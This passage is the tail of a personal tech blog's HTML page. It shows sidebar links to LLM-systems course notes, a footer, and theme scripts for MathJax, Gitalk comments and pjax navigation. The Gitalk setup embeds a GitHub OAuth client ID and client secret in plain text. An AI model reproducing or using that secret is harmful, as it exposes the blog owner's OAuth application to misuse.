src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11868 LLM Sys: Decoding"/></a><div class="content"><a class="title" href="/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/" title="11868 LLM Sys: Decoding">11868 LLM Sys: Decoding</a><time datetime="2026-02-13T01:00:00.000Z" title="Created 2026-02-12 20:00:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260126152238836.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11868 LLM Sys: Tokenization and Embedding"/></a><div class="content"><a class="title" href="/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/" title="11868 LLM Sys: Tokenization and Embedding">11868 LLM Sys: Tokenization and Embedding</a><time datetime="2026-02-12T20:30:00.000Z" title="Created 2026-02-12 15:30:00">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 Machine Learning Systems: Transformer, Attention, and Optimizations"><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20260122210733236.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="15642 Machine Learning Systems: Transformer, Attention, and Optimizations"/></a><div class="content"><a class="title" href="/2026/02/09/15642-Machine-Learning-Systems/15642-ML-Systems-Transformer-Attention-Optimizations/" title="15642 Machine Learning Systems: Transformer, Attention, and Optimizations">15642 Machine Learning Systems: Transformer, Attention, and Optimizations</a><time datetime="2026-02-09T19:30:00.000Z" title="Created 2026-02-09 14:30:00">2026-02-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Xiang Li</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const commentCount = n => {
+    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+    if (isCommentCount) {
+      isCommentCount.textContent= n
+    }
+  }
+
+  const initGitalk = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGitalk = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const gitalk = new Gitalk({
+      clientID: 'fb37ffde539166b338d8',
+      clientSecret: '00c01014243d312219aa68b6a2e22f7f19f4c8ef',
+      repo: 'blog-comments',
+      owner: 'XLOverflow',
+      admin: ['XLOverflow'],
+      updateCountCallback: commentCount,
+      ...option,
+      id: isShuoshuo ? path : (option && option.id) || '06c1a45489de87739e648860576e9228'
+    })
+
+    gitalk.render('gitalk-container')
+  }
+
+  const loadGitalk = async(el, path) => {
+    if (typeof Gitalk === 'function') initGitalk(el, path)
+    else {
+      await btf.getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+      await btf.getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js')
+      initGitalk(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Gitalk' === 'Gitalk'
+      ? window.shuoshuoComment = { loadComment: loadGitalk }
+      : window.loadOtherComment = loadGitalk
+    return
+  }
+
+  if ('Gitalk' === 'Gitalk' || !true) {
+    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+    else loadGitalk()
+  } else {
+    window.loadOtherComment = loadGitalk
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
